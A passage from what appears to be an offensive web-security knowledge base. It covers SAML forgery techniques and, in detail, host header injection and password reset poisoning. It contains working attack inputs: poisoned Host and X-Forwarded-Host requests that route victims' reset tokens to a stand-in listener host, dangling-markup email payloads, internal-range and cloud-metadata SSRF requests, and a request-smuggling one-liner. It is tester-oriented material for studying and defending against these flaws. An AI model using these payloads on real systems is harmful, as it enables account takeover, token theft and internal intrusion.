        examples: [
          { code: 'Burp -> Extensions -> BApp Store -> SAML Raider', note: 'Adds a SAML tab to any request carrying SAMLRequest or SAMLResponse, plus a certificate manager.' },
          { code: './samle.py -u https://target.example    (or -U url_list.txt, or -r "<idp redirect url>")', note: 'SAMLExtractor. The script is samle.py, the list flag is a capital -U, and -r takes an IdP redirect URL. Finds SAML consumer endpoints across a host list so you know which apps are in the federation. Needs libxml2-dev and libxmlsec1-dev.' },
          { code: 'xmlsec1 --verify --pubkey-cert-pem idp.crt --id-attr:ID urn:oasis:names:tc:SAML:2.0:assertion:Assertion mangled.xml', note: 'After every edit: confirms whether your document still verifies, so an SP rejection tells you about SP logic rather than your own mistake.' },
          { code: 'Version check:  ruby-saml < 1.12.3 / 1.17.0 (CVE-2024-45409), <= 1.17.0 (CVE-2025-25291, CVE-2025-25292); simplesamlphp/saml2 <= 4.16.15 or 5.0.0-alpha.1 to 5.0.0-alpha.19, and saml2-legacy <= 4.16.15 (CVE-2025-27773)', note: 'If the SP discloses its library, the version alone can decide the finding before you send a single malformed document.' },
        ],
      },
    ],
    stride: {
      spoofing: {
        weaponization: [
          'Strip every ds:Signature and post a hand written Response with a NameID of your choosing, against an SP that only verifies a signature when one is present.',
          'Wrap with XSW1 through XSW8 so the IdP signature keeps validating over the original assertion while the SP reads the NameID out of a cloned assertion you wrote.',
          'Turn any single IdP-signed document into a universal forgery kit where the digest and the signature are not bound to the element consumed (ruby-saml CVE-2024-45409, and the REXML versus Nokogiri parser differentials CVE-2025-25291 and CVE-2025-25292).',
          'Re-sign a forged assertion with a self-signed clone of the IdP certificate, against an SP that trusts the key carried in ds:KeyInfo instead of a pinned IdP thumbprint.',
          'Truncate a genuinely signed NameID with an XML comment, entity reference, or CDATA split so an account you legitimately own reads as the victim account (the CVE-2017-11427 family).',
          'Encrypt a wrapped, forged assertion to the SP public key on a stack that extracts signatures before decryption and never verifies the inner one (GitHub Enterprise Server CVE-2024-4985 and CVE-2024-9487).',
          'Replay a captured victim SAMLResponse where there is no one-time-use cache and NotOnOrAfter is unenforced, inheriting their session verbatim.',
          'Present an assertion legitimately issued for one service provider at a different one that shares the IdP but ignores Audience, Recipient, and Destination, authenticating at a service you were never federated into (token recipient confusion).',
          'Prepend an unsigned SAMLRequest to an IdP-signed SAMLResponse on the Redirect binding so the SP verifies one parameter and consumes the other (simplesamlphp CVE-2025-27773).',
          'Reach a SAML ACS handler on a product where SSO was never configured, so the verification mode, trusted issuer, and certificate path sit at empty defaults and any schema valid Response authenticates.',
          'Force a victim into an attacker chosen identity with an auto-submitting form to the ACS, where unsolicited responses are accepted because InResponseTo is absent or unchecked.',
          'Impersonate the identity provider itself by forging a LogoutRequest or LogoutResponse, which passes through the same unverified code path as the login assertion.',
          'Cross a tenant boundary in multi-tenant SaaS by keeping a signature from a tenant you control while naming a victim tenant in saml:Issuer or in the NameID domain.',
        ],
        why: 'A SAML assertion is a bearer statement of identity whose only integrity binding is an XML signature over one referenced element, so any divergence between the element the verifier hashes and the element the service provider reads the NameID from lets the attacker put an arbitrary name in the bytes that are actually consumed while the cryptography still checks out.',
      },
      elevation_of_privilege: {
        weaponization: [
          'Inject or rewrite the AttributeStatement so the assertion asserts groups, roles, or entitlements the IdP never issued, since most applications authorize on attributes rather than on the NameID.',
          'Set the NameID to a known administrator instead of an ordinary user once any forgery primitive works.',
          'Abuse just-in-time provisioning: assert a NameID that does not exist yet together with an admin group attribute, so the SP creates a brand new privileged local account for you.',
          'Use directory style identity forms such as DOMAIN\\Administrator or user@domain to slip past blocked-username or reserved-name checks that only match the plain string.',
          'Escalate an ordinary federated login into a service you were not entitled to by replaying the assertion at a second SP in the same federation.',
        ],
        why: 'Federated authorization is carried in the same signed document as authentication, so once the document is forgeable the attacker writes their own group and role claims and the application grants exactly what those claims say.',
      },
      tampering: {
        weaponization: [
          'Rewrite the NameID and attribute values inside a document whose signature still validates, because the signature covers a different element than the one that is read.',
          'Edit the unsigned Response wrapper when only the Assertion is signed: flip samlp:StatusCode from AuthnFailed or Requester to Success, and change Destination and InResponseTo at will.',
          'Extend or remove the validity window by editing NotBefore, NotOnOrAfter, and SessionNotOnOrAfter, or by deleting saml:Conditions outright.',
          'Inject a second ds:Signature or SignedInfo that only one of the two parsers in the verification path can see, so the verified structure and the consumed structure differ.',
          'Inject newlines through RelayState into a response writing routine to terminate the headers early and control the Content-Type and body the SP returns.',
        ],
        why: 'XML canonicalisation is designed to let a signed document be reserialised without invalidating the signature, so anything the canonical form erases or that falls outside the signed reference becomes attacker editable data that still arrives wearing a valid signature.',
      },
      information_disclosure: {
        weaponization: [
          'Read files off the service provider host with an XXE entity in the SAML document, which is processed before signature verification and therefore needs no valid signature at all.',
          'Turn the SP into an SSRF proxy with an out-of-band XXE entity, reaching internal services and cloud metadata from inside its network perimeter, pre-authentication.',
          'Exfiltrate file contents with an XSLT stylesheet in ds:Transforms, using unparsed-text to read a file and a second unparsed-text against an attacker URL built from it.',
          'Recover process memory where a SAML XML parser over-reads a malformed or unterminated attribute value and the over-read bytes are reflected back to you, as in Citrix NetScaler ADC and Gateway CVE-2026-8451, where an unquoted attribute on /saml/login against an appliance configured as a SAML identity provider leaks adjacent memory in the NSC_TASS cookie a few bytes at a time, stopping at the first null or control byte.',
          'Harvest the SP entityID, ACS URLs, certificates, and library fingerprint from unauthenticated metadata endpoints, which maps the whole federation before any payload is sent.',
        ],
        why: 'The SP parses attacker supplied XML, and resolves DTD entities and signature transforms, before it decides whether to trust the document, so the XML processor becomes a pre-authentication file read and outbound request primitive on the SP host.',
      },
      denial_of_service: {
        weaponization: [
          'Send an entity expansion bomb in the SAML document, amplified twice on the Redirect binding because DEFLATE compresses the expansion payload to a few hundred bytes on the wire.',
          'Crash the SAML service outright with a malformed message where error checking is insufficient and a parse failure reloads the process rather than returning an error, as in Cisco Secure Firewall ASA and FTD CVE-2026-20101.',
          'Forge LogoutRequest messages against the same unverified code path to terminate arbitrary users sessions repeatedly, locking legitimate users out of the application.',
        ],
        why: 'Unauthenticated XML parsing on an internet facing endpoint accepts unbounded work and malformed structure before any trust decision is made, and the logout half of the protocol lets an attacker who can forge one message destroy sessions rather than create them.',
      },
      repudiation: {
        weaponization: [
          'Exploit the fact that the SP never contacts the IdP: the SP logs a successful federated login for which no matching authentication event exists at the identity provider, so the two logs disagree and neither side notices.',
          'Mint an assertion for your own account from any signed document and later deny an action by pointing at the same forgeable SSO path, since the SP session log cannot distinguish a genuine login from a forged one.',
        ],
        why: 'The service provider treats the assertion as proof of who acted and writes that name into its audit trail, so a forged assertion does not just grant access, it rewrites the attribution of everything done in the resulting session, and the only record that could contradict it lives at an identity provider the SP never consults.',
      },
    },
  },

  {
    id: 'host-header-injection',
    name: 'Host Header Injection & Password Reset Poisoning',
    summary: 'Control the hostname the server believes it is serving, so every absolute URL it generates, and every routing decision made in front of it, points where the attacker chose.',
    tags: ['host-header', 'account-takeover', 'server-side'],
    executionContext: {
      where: 'On the server side, in two places: the reverse proxy or load balancer that routes on Host, and the application code that reads the Host value back out to build absolute URLs. The payoff executes later, in the victim mail client and browser, or on the attacker listener.',
      detail: "Nothing runs in the browser at injection time. The application process on the app host reads the header and templates it into a string it is about to emit: a Location header, an anchor in an outbound email, a canonical link, a script src, a callback URL registered with a third party. That poisoned artifact is then delivered out of band, so the second half of the attack executes wherever the artifact is rendered, which for password reset poisoning is the victim's email client and then the victim's browser, whose request is what actually carries the token to the attacker's host. The attacker never touches the victim's mailbox; the victim's own click does the exfiltration. The routing based variants execute somewhere else entirely: the front end proxy, CDN, or load balancer resolves the attacker supplied hostname and opens a fresh connection from inside the trusted network, so the request runs with the proxy's network position and source address, and the application may never see it at all. Virtual host attacks are a third location again, where the flaw lives in the server's routing table rather than in any line of application code. Getting this split right matters for reporting: the vulnerable component is whichever one consumed the header, and it is often not the one that returned the response you are looking at.",
    },
    howTo: [
      {
        heading: 'Root cause and why it matters',
        body: [
          'HTTP/1.1 made Host mandatory because one IP address serves many sites, so the header is how a client names which site it wants. That makes it the one request field whose entire job is to tell the server its own identity, and like every other request field it is fully attacker controlled.',
          'Applications constantly need to emit an absolute URL: a reset link in an email, a redirect after login, a canonical tag, a share link, a webhook callback. Off the shelf software does not know what domain it was deployed on unless someone wrote it in a config file, so frameworks hand the developer the Host header instead. Reading it back out means the requester, not the operator, picks the domain the site prints.',
          'The second half of the problem is infrastructure. A reverse proxy, CDN, or load balancer routes on Host, so the same header also decides which backend the request reaches. Where the routing layer will resolve and connect to whatever hostname it is handed, the header stops being a string bug and becomes a network primitive.',
        ],
        examples: [
          { code: "PHP:   <a href=\"https://<?= $_SERVER['HTTP_HOST'] ?>/reset?token=$t\">Reset</a>", note: 'The classic sink. Whoever sends the request names the domain that goes in the mail.' },
          { code: "Flask: url_for('reset', token=t, _external=True)", note: 'Builds from request.host unless the SERVER_NAME config value is set, so by default the requester supplies the host.' },
          { code: 'Express: req.hostname   (reads X-Forwarded-Host once trust proxy is enabled)', note: 'Turning on trust proxy silently moves the source of truth to a header anyone can send if the edge does not strip it.' },
        ],
      },
      {
        heading: 'Where to look: every artifact that contains the site name',
        body: [
          'Inventory the things the server builds that carry its own hostname, because each one is a separate sink and they are often built by different code. Password reset and magic login emails, email verification and invite links, share and export links, 3xx Location headers after login, logout, and SSO, link rel=canonical, base href, og:url, absolute script src and stylesheet href in server rendered HTML, JSON responses with a self or next or links field, Set-Cookie Domain, a Content-Security-Policy report-uri, sitemap entries, webhook and callback URLs registered with third parties, and the redirect_uri or SAML AssertionConsumerServiceURL when those are constructed from the request host rather than from configuration.',
          'Reset flows have a second entry point worth testing separately: the resend link endpoint. It is frequently a different handler, written later, with less hardening than the original forgot password route. The same goes for admin initiated invites and for the "you have been added to a team" mail, which usually shares the URL builder but not the validation.',
          'Then look at the routing layer as its own target: which hostnames the front end accepts and forwards, whether there is a catch all or default virtual host, and whether internal names resolve from the edge. That surface is invisible from the application response.',
        ],
        examples: [
          { code: 'Reset sinks:  POST /forgot-password   /api/auth/reset   /resend-verification   /invite   /magic-link', note: 'Test each one; they are usually different handlers even when they share a template.' },
          { code: "curl -s -D - -o /dev/null https://target.example/login | grep -iE '^(location|set-cookie|link|content-security-policy):'", note: 'Header sinks. Any absolute URL here is a candidate.' },
          { code: "curl -s https://target.example/ | grep -iE 'rel=\"canonical\"|<base href|og:url|src=\"https?://'", note: 'Body sinks. An absolute self reference in HTML means the host came from somewhere.' },
        ],
      },
      {
        heading: 'Detection: proving the header reached something',
        body: [
          'Use a domain you own with a wildcard DNS record and a listener, not a throwaway string. A canary hostname gives you three independent signals from one request: the value reflected in the response you get back, an out of band DNS or HTTP callback from the target infrastructure, and, for mail flows, a message in your own inbox. Give each test a unique subdomain so the callback tells you which probe fired.',
          'You do not need the victim mailbox to prove password reset poisoning. Request a reset for an account you control, with the poisoned header, then open your own inbox and read the link. If it points at your canary, the finding is complete and demonstrable without touching anyone else. That is also the version of the proof of concept a triager can replay.',
          'When there is no mail and no reflection, work out which layer ate the request. A poisoned value appearing in the Location header means the application consumed it. A 403 or a default virtual host page from the edge means the front end validated it and the app never saw it. A 421 Misdirected Request is the specific signal that a front end is comparing the Host header against the TLS SNI name, which tells you to stop attacking Host directly and move to the override headers.',
          'Test candidate headers one at a time. Firing all of them in a single request proves a flaw exists but leaves you unable to say which header to report or which component to blame, and half the time the answer changes the severity.',
        ],
        examples: [
          { code: "curl -sk https://target.example/ -H 'Host: canary.oob.example' -D - -o /dev/null", note: 'Baseline probe. Watch Location, Set-Cookie Domain, and any absolute URL in the body.' },
          { code: "curl -sk https://target.example/ -H 'Host: target.example' -H 'X-Forwarded-Host: canary.oob.example' -D - -o /dev/null", note: 'Keep Host legitimate so the edge routes normally, and poison the value the app trusts.' },
          { code: 'interactsh-client -v      (or a Burp Collaborator payload as the canary host)', note: 'A DNS lookup with no HTTP request still proves something in the chain parsed and resolved your hostname.' },
          { code: "Self test:  POST /forgot-password  with  email=you@yours.example  and  X-Forwarded-Host: canary.oob.example", note: 'Read your own mail. Full proof, no third party involved.' },
        ],
      },
      {
        heading: 'Password reset poisoning end to end',
        body: [
          'The normal flow has four steps: the user submits an email address, the server mints a token bound to that account, the server mails an absolute link containing the token, and the user clicks it and sets a new password. If the hostname used in step three comes from the request in step one, you decide where the token goes.',
          'What makes this stronger than phishing is that the mail is genuine. It is sent by the target own mail infrastructure, so SPF, DKIM, and DMARC all pass, it arrives in the thread the user expects, and it asks for no credential. The token moves only when the victim clicks, and it arrives in your access log as an ordinary GET.',
          'Mechanics: send the reset request for the victim address with the poisoned host, keep a listener running, and when the request lands, take the token straight to the real site to set a new password. Token lifetime is your window and it is often fifteen to sixty minutes, so a link the victim ignores is worth nothing. Check whether the value in the link is the token the reset page accepts, or a one time identifier that gets exchanged for one, because that changes how you word the report even though the takeover is the same.',
          'Variations worth trying before you call it not vulnerable: only the resend endpoint is poisonable; the web path validates Host but a background worker renders the mail from X-Forwarded-Host; or the base URL comes from a request body field rather than a header, which is the identical bug wearing different clothes.',
        ],
        examples: [
          { code: 'POST /forgot-password HTTP/1.1\nHost: canary.oob.example\nContent-Type: application/x-www-form-urlencoded\n\nemail=victim@corp.example', note: 'If the mail carries https://canary.oob.example/reset?token=..., the token walks to you on the victim click.' },
          { code: 'POST /forgot-password HTTP/1.1\nHost: target.example\nX-Forwarded-Host: canary.oob.example', note: 'The middleware variant: the edge validates Host, the app builds the URL from the forwarded value.' },
          { code: '{"email":"victim@corp.example","baseUrl":"https://canary.oob.example"}', note: 'Same bug in a body field. Also try redirect_url, redirect_uri, return_to, next, callbackUrl, tenant, and domain.' },
          { code: 'python3 -m http.server 80      then watch for:  GET /reset?token=... HTTP/1.1', note: 'The access log line is your evidence; paste it into the report with the timestamp.' },
          { code: "curl -s 'https://target.example/reset?token=CAPTURED' -D - -o /dev/null", note: 'Redeem the captured token against the real host, not the canary, to complete the takeover.' },
        ],
      },
      {
        heading: 'When Host itself is validated: override headers and ambiguous requests',
        body: [
          'If the edge rejects an unknown Host with a 403, a 421, or a default virtual host page, stop attacking Host directly and attack the disagreement between components. There are two families: headers the application trusts more than it should, and request shapes where the proxy and the application disagree about which value is the host.',
          'The override headers exist because reverse proxies genuinely need to tell the backend what the client originally asked for. The bug is that most deployments never strip them at the perimeter, so a client can make the claim that only the proxy should be able to make. Forwarded is the standardised one from RFC 7239 and is often accepted where the X prefixed variants have been blocked, because the blocklist was written from memory.',
          'The ambiguous request shapes exploit spec corners. RFC 9112 requires a server to reject a request with more than one Host header, but a chain has several parsers and only one of them has to be lenient. Absolute form in the request line must be accepted by servers and is required when talking to a proxy, so a front end may route on the URI while the app reads Host, or the reverse. Line wrapping is worth knowing about but is mostly historical: obs-fold was deprecated in RFC 7230 and current servers reject it or collapse it to a space, so treat a hit there as a finding about an old component rather than something you expect to work.',
        ],
        examples: [
          { code: 'X-Forwarded-Host: canary.oob.example', note: 'Most common by a wide margin. Read by Symfony trusted proxies, Django with USE_X_FORWARDED_HOST, Express with trust proxy, Werkzeug ProxyFix, and countless nginx templates.' },
          { code: 'X-Host: c.oob.example    X-Forwarded-Server: c.oob.example    X-HTTP-Host-Override: c.oob.example    X-Original-Host: c.oob.example', note: 'Non standard but implemented by specific middleware. Send one per request so the callback identifies the winner.' },
          { code: 'Forwarded: host=canary.oob.example;proto=https', note: 'RFC 7239, the standardised replacement for the X-Forwarded-* set. Frequently supported where the others are filtered.' },
          { code: 'GET /example HTTP/1.1\nHost: target.example\nHost: canary.oob.example', note: 'Duplicate Host. RFC 9112 says reject, but you only need one lenient parser in the chain; front end and app may pick opposite copies.' },
          { code: 'GET https://target.example/ HTTP/1.1\nHost: canary.oob.example', note: 'Absolute form request line. The front end routes on the URI and passes validation while the app reads the poisoned Host.' },
          { code: 'Host: target.example:canary.oob.example', note: 'Non numeric port. A validator that splits on the colon and checks only the left side passes it, and the whole string still lands in the generated URL.' },
          { code: 'Host: target.example@canary.oob.example        Host: canary.oob.example#target.example', note: 'Userinfo and fragment confusion. A URL parser reads everything before the @ as credentials, so the real host is the attacker one.' },
          { code: 'Host: nottarget.example        Host: target.example.canary.oob.example', note: 'Suffix and prefix tricks beat endsWith, startsWith, and contains allowlists. Register the domain so it actually resolves.' },
          { code: 'GET / HTTP/1.1\nHost: canary.oob.example\n Host: target.example', note: 'Line wrapped continuation (obs-fold). Deprecated by RFC 7230 and rejected by modern servers, so this is a legacy check, not a current expectation.' },
        ],
      },
      {
        heading: 'Dangling markup when you cannot own the whole link',
        body: [
          'Sometimes the domain part is validated but the rest of the value is not, or your reflection lands in the middle of the mail rather than at the start of a URL. If the reflection sits inside an HTML attribute in an HTML email, you do not need the link at all. Break out of the attribute, open an unterminated one, and let it swallow everything that follows, including the token.',
          'Mail clients render HTML but do not run script, so dangling markup is the exfiltration channel that still works there. The non numeric port trick from the previous section is the usual way in, because a domain only validator accepts target.example:anything and the whole string is still templated into the href.',
          'Reliability depends on the client. Most modern mail clients block remote images until the user asks for them, so a payload that depends on an auto loaded img is weaker than one that turns the visible call to action into an anchor pointing at your host: the victim was already going to click something, and the click carries the rest of the email in the query string.',
          'Always read the raw MIME source of the test mail rather than the rendered version. You need to see exactly which quote character encloses your value and what markup follows it, and the rendered view hides both.',
        ],
        examples: [
          { code: "Host: target.example:'<a href=\"https://canary.oob.example/?", note: 'Closes the single quoted href in the template, then opens an anchor whose href absorbs the following markup, including the reset token, as a query string.' },
          { code: 'Host: target.example:"><img src="https://canary.oob.example/?', note: 'Double quoted template variant. Only fires if the client loads remote content, so treat it as the weaker of the two.' },
          { code: 'Read the raw message:  View source in the mail client, or fetch the .eml and open it in a text editor', note: 'Confirms the exact quoting context before you build the breakout.' },
        ],
      },
      {
        heading: 'Host based authentication bypass and virtual host discovery',
        body: [
          'Some applications decide trust from the hostname. If the code believes a request whose Host is localhost came from the machine itself, then anyone able to send that header is local, and any admin panel behind that check is open. The same pattern shows up as an internal virtual host name treated as the admin site, or a staging safeguard that only refuses when the host looks public. The check is worthless because Host is a client supplied string, but it is common enough to be worth one request. This is a specific, provable case of the broad Authentication Bypass entry: there the gate is a credential check, here it is an assumption about network position encoded in a header.',
          'Virtual host brute forcing is the discovery side. One IP serves many names, and a name with no public DNS record is still reachable if you name it in the Host header. Point at the IP address and vary only the Host to find staging apps, internal dashboards, admin consoles, and abandoned deployments. This is a different set from DNS subdomain enumeration: DNS finds names that resolve, virtual host fuzzing finds names the server answers for whether or not they resolve, which is precisely the set someone intended to keep private.',
          'Filter on response size, word count, or a body hash rather than status code. The default virtual host answers everything with the same page, so a status filter shows a wall of identical 200s and you will conclude there is nothing there.',
        ],
        examples: [
          { code: "curl -sk https://target.example/admin -H 'Host: localhost' -D - -o /dev/null", note: 'Also try 127.0.0.1, ::1, the bare short hostname, intranet.target.example, admin.target.example, and the backend private IP.' },
          { code: "ffuf -w vhosts.txt -u https://203.0.113.10/ -H 'Host: FUZZ.target.example' -fs 4242", note: 'Hit the IP and vary only the Host. Set -fs to the default vhost response size, or use -ac to autocalibrate, or nothing stands out.' },
          { code: 'gobuster vhost -u https://target.example -w vhosts.txt --append-domain', note: 'Gobuster 3.2 and later require --append-domain to join wordlist entries to the base domain; without it the words are used as whole hostnames.' },
          { code: 'curl --connect-to internal.target.example:443:203.0.113.10:443 https://internal.target.example/', note: 'Sets SNI and Host to the internal name while connecting to a chosen IP. A 421 Misdirected Request back means the edge is cross checking SNI against Host.' },
        ],
      },
      {
        heading: 'Routing based Host: SSRF from the proxy position',
        body: [
          'When the component reading Host is a reverse proxy or load balancer that will resolve and connect to whatever name it is handed, the header is a full SSRF primitive with the proxy network position and source address. Internal services that have no authentication because someone assumed network isolation are suddenly one header away. This differs from the SSRF entry, where the application fetches a URL you supplied: here no application code is involved and there is no URL parameter to find, only the routing layer.',
          'Detect out of band first. Put a collaborator or interactsh hostname in Host and watch for a DNS lookup arriving from the target egress. A lookup with no follow up HTTP request is still a positive: it proves the routing layer parsed and resolved your value, and the missing request usually just means egress filtering. Then sweep private ranges by putting bare IPs in Host and reading the difference between a gateway timeout and a real response.',
          'Two shapes beat validation. Absolute form in the request line, where the front end routes on the URI while validation only inspected Host, so both values are present and they disagree. And the connection state attack, where a front end validates only the first request on a TCP connection and then trusts everything that follows: send an innocuous request, then a poisoned one down the same keep alive connection. That second one needs a raw single connection, because an ordinary HTTP client will happily open a fresh connection for the second request and reset the validation.',
          'A malformed request line can also confuse a hand rolled proxy into treating your value as the destination. If the proxy prefixes its own backend name onto what you sent, standard URL parsers read everything before the @ as userinfo and route to whatever follows it.',
        ],
        examples: [
          { code: "curl -sk https://target.example/ -H 'Host: canary.oob.example'   then check the OOB log for a DNS lookup", note: 'A resolution from the target egress proves the routing layer accepted an arbitrary destination.' },
          { code: "Host: 192.168.0.1      sweep 192.168.0.0/24 and 10.0.0.0/8", note: 'A single 200 among a wall of 504s is the internal service. Also try the container network ranges the platform uses.' },
          { code: "curl -sk https://target.example/latest/meta-data/ -H 'Host: 169.254.169.254'", note: 'Cloud metadata, if the proxy will connect to link local. IMDSv2 requires a PUT to get a token first, so a plain GET failing does not mean the route is closed.' },
          { code: 'GET https://192.168.0.12/admin HTTP/1.1\nHost: target.example', note: 'Absolute form: the front end routes on the URI while the legitimate Host sails through validation.' },
          { code: "printf 'GET / HTTP/1.1\\r\\nHost: target.example\\r\\nConnection: keep-alive\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\nHost: 192.168.0.1\\r\\n\\r\\n' | openssl s_client -quiet -connect target.example:443", note: 'Connection state attack: two requests, one connection. In Burp Repeater this is a tab group sent with "Send group in sequence (single connection)".' },
          { code: 'GET @internal.target.example/ HTTP/1.1', note: 'Malformed request line. A proxy that concatenates its backend name produces http://backend@internal.target.example/, and the parser routes to the part after the @.' },
        ],
      },
      {
        heading: 'Caches, frameworks, and what actually fixes it',
        body: [
          'If a shared cache does not include the header in its cache key, a Host derived reflection stops being a one request bug and becomes a stored one served to every visitor. Host and X-Forwarded-Host are the textbook unkeyed inputs, and that whole discipline lives in the Web Cache Poisoning entry. The only thing to carry across from here is the join: prove the reflection with the Host primitive first, then check X-Cache and a climbing Age to see whether it persists for anyone but you, and use a cache buster parameter while you are still iterating so you are not poisoning a live entry.',
          'Framework behaviour decides whether a finding is real, so check it before writing the report. Django ALLOWED_HOSTS defaults to an empty list and get_host raises DisallowedHost for anything not on it, but that validation only applies through get_host: code reading request.META HTTP_HOST directly skips it entirely. USE_X_FORWARDED_HOST is off by default and switching it on trusts X-Forwarded-Host with no verification that a proxy set it. Rails has ActionDispatch::HostAuthorization, but config.hosts is populated in development only; in other environments it is empty and no Host check runs at all, so "Rails is protected" is a statement about a laptop, not about production.',
          'The advice everyone repeats for PHP, swap $_SERVER HTTP_HOST for $_SERVER SERVER_NAME, is not a fix on Apache with UseCanonicalName Off, which is the default in several distributions, because SERVER_NAME is then populated from the Host header too. It is only safe when UseCanonicalName is On with an explicit ServerName, or on nginx where server_name comes from the configuration file.',
          'The real fix is to stop deriving identity from the request: put the canonical base URL in configuration, emit relative URLs where possible, have the edge reject or rewrite unknown Host values before they reach the app, strip every X-Forwarded-* header at the perimeter so only your own proxy can set them, and keep internal only virtual hosts off the same server as public content.',
          'One cautionary example about checking the artifact instead of assuming. Stock WordPress builds the reset link from the site URL stored in the database, so classic link poisoning does not work against it. CVE-2017-8295, reported by Dawid Golunski in 2017, attacked a different artifact: the mail envelope From and Return-Path, which were derived from SERVER_NAME. Even then it only pays out if the victim mail bounces, autoresponds, or the victim replies with the original message quoted. Specific to WordPress through 4.7.4, and conditional, so do not present it as a general WordPress takeover.',
        ],
        examples: [
          { code: "curl -sk 'https://target.example/?cb=RANDOM' -H 'X-Forwarded-Host: canary.oob.example' -D - -o /dev/null | grep -iE '^(x-cache|age|vary):'", note: 'Cache buster keeps your poison in your own entry while you test; the response headers tell you whether it would have stuck.' },
          { code: 'Grep the codebase:  HTTP_HOST | SERVER_NAME | request.get_host | req.hostname | request.host | X-Forwarded-Host', note: 'Whitebox shortcut. Every hit is a candidate sink and the surrounding line tells you which artifact it feeds.' },
        ],
      },
      {
        heading: 'Tools and workflow',
        body: [
          'Work in order: prove the header is read at all, then establish which header and which artifact, then decide the impact class. The same reflection is a low severity informational when it lands in a canonical tag, an account takeover when it lands in a reset link, and a critical when it routes you into the internal network, and the difference is entirely in the artifact you traced it to.',
          'Automate the first step across the whole host list rather than testing by hand. Most of the value is in breadth: one forgotten legacy application behind the same edge is usually where this lives, and it is rarely the app you were staring at.',
        ],
        examples: [
          { code: 'Burp BApp: Collaborator Everywhere', note: 'Injects Collaborator payloads into headers across all in scope proxied traffic, so pingbacks surface hosts you never manually tested. Written by James Kettle, Burp Pro only.' },
          { code: 'Burp BApp: Param Miner, "Guess headers"', note: 'Finds which headers the application actually reads, which is also how you identify the unkeyed ones for the cache follow up.' },
          { code: "httpx -l hosts.txt -H 'X-Forwarded-Host: canary.oob.example' -sc -cl -title", note: 'Sweep a host list for the header changing the response; diff status and content length against a clean run to find the ones that reacted.' },
          { code: 'interactsh-client -v      with a wildcard DNS record on your own domain', note: 'Self hosted out of band listener. Use a unique subdomain per probe so the callback identifies which request produced it.' },
          { code: 'Burp Repeater tab group, send mode "Send group in sequence (single connection)"', note: 'The practical way to run the connection state attack without hand writing raw requests through openssl.' },
        ],
      },
    ],
    stride: {
      spoofing: {
        weaponization: [
          'Become a specific user by poisoning their password reset link so the token arrives at your host, then redeeming it on the real site and logging in as them.',
          'Capture other identity bearing links built the same way: magic login links, email verification links, team invites, and single use share links, each of which authenticates whoever holds it.',
          'Impersonate the site itself to the victim, because the poisoned mail is sent by the target own infrastructure and passes SPF, DKIM, and DMARC, so a link to attacker infrastructure inherits the sender authenticity that no phishing domain can buy.',
          'Claim to be a local or internal caller with Host: localhost, 127.0.0.1, or an internal virtual host name, so an application that infers network position from the hostname treats an internet request as one from inside.',
          'Assert a claim only the reverse proxy should be able to make by sending X-Forwarded-Host, X-Forwarded-Server, X-HTTP-Host-Override, or Forwarded host=, so the application believes an infrastructure component vouched for the value.',
          'Resolve as a different tenant in multi tenant applications where the hostname selects the organisation, customer, or workspace context.',
          'Appear to internal services as a trusted in network client, because the routing based variant makes the front end proxy open the connection, so the backend sees its own load balancer rather than the internet.',
          'Speak as the site to a third party by poisoning the host in a callback, webhook, OAuth redirect_uri, or SAML AssertionConsumerServiceURL that is built from the request host, so an external party delivers credentials to attacker infrastructure under the target name.',
          'Forge the sender envelope of transactional mail where From and Return-Path derive from the server name, so bounces, autoresponses, and quoted replies carry the original message back to a mailbox the attacker controls.',
          'Serve attacker JavaScript from within the target origin by poisoning an absolute script src or resource URL in server rendered HTML, so the code that runs speaks with the site own identity.',
        ],
        why: 'The Host header is the only thing that tells a shared web server which of its identities it is currently wearing, so an application that reads it back out is letting the requester declare, on the site behalf, what the site is called; every name derived from that value (the reset URL the user trusts, the mail envelope, the tenant that gets loaded, the trust level assigned to the caller) is then a name the attacker chose rather than one the operator configured.',
      },
      tampering: {
        weaponization: [
          'Rewrite the destination of a link, redirect, canonical tag, or resource URL inside a page or email the site generates, so what the site emits is not what it intended to emit.',
          'Inject markup into an HTML email through the reflected host value, using a non numeric port to break out of an href attribute and restructure the message the recipient sees.',
          'Poison a shared cache entry through Host or X-Forwarded-Host when the cache does not key on it, so the rewritten response is stored and served to every visitor rather than only to you (the mechanics live in the Web Cache Poisoning entry).',
          'Set the victim password to a value you choose once the reset token has been captured, permanently changing account state.',
          'Reach internal admin endpoints through routing based Host and perform state changing actions there, such as deleting users or editing configuration, against interfaces that never expected an untrusted caller.',
          'Deliver classic injection payloads through the Host value into backends that log, template, or query it, turning the header into a delivery channel for SQL injection, template injection, or command injection.',
        ],
        why: 'The header is spliced verbatim into strings the server is about to emit and into the routing decision made in front of it, so the attacker edits both the content the site produces and the destination the infrastructure sends requests to, without ever going through the application intended write interface.',
      },
      information_disclosure: {
        weaponization: [
          'Capture a password reset, magic login, verification, or invite token by owning the hostname in the generated link, so a secret meant for the user is delivered to the attacker instead.',
          'Exfiltrate the remainder of an HTML email with a dangling markup breakout, which absorbs everything after the injection point, including the token and any other content the message carries.',
          'Reach internal only virtual hosts, staging deployments, and admin dashboards by naming them in Host, and read content that has no public DNS record and no authentication.',
          'Map the internal network by iterating the Host header across private ranges and reading the difference between gateway timeouts and real responses.',
          'Discover unlisted virtual hosts by brute forcing names against the IP, which surfaces pre production and internal applications that DNS enumeration cannot see because they never resolved.',
          'Read cloud instance metadata and other link local services when the routing layer will connect to whatever host it is given.',
          'Recover the target own outbound mail content where the envelope sender derives from the server name, because a bounce or autoresponse returns the original message, reset link included, to the attacker chosen domain.',
          'Leak a token through the Referer when the poisoned landing page loads an attacker resource, though modern browsers default to strict-origin-when-cross-origin and strip the path and query cross origin, so this path is far weaker than older write ups suggest.',
        ],
        why: 'Whatever the server constructs from the header ends up aimed at the attacker, so secrets that were supposed to travel outward to one specific user (a token inside a link) or to stay inside the perimeter entirely (an internal virtual host) are delivered instead to an endpoint the attacker owns and logs.',
      },
      elevation_of_privilege: {
        weaponization: [
          'Take over an administrator account by poisoning their reset link, inheriting every permission that account holds rather than only the victim own data.',
          'Access admin only functionality by presenting a privileged hostname such as localhost or an internal site name that the application treats as inherently trusted.',
          'Reach an internal administrative interface through routing based Host SSRF, where the interface has no authentication at all because its designers assumed network isolation was the control.',
          'Cross a tenant boundary in multi tenant software where the hostname selects the organisation context, gaining the rights of an account in a different customer namespace.',
        ],
        why: 'Two separate authorization shortcuts collapse at once: the assumption that only the account owner can ever hold a valid reset token, and the assumption that a request bearing a private hostname must have originated inside the perimeter, and both of those assumptions rest on a header the client writes.',
      },
    },
  },

  {
    id: 'session-fixation',
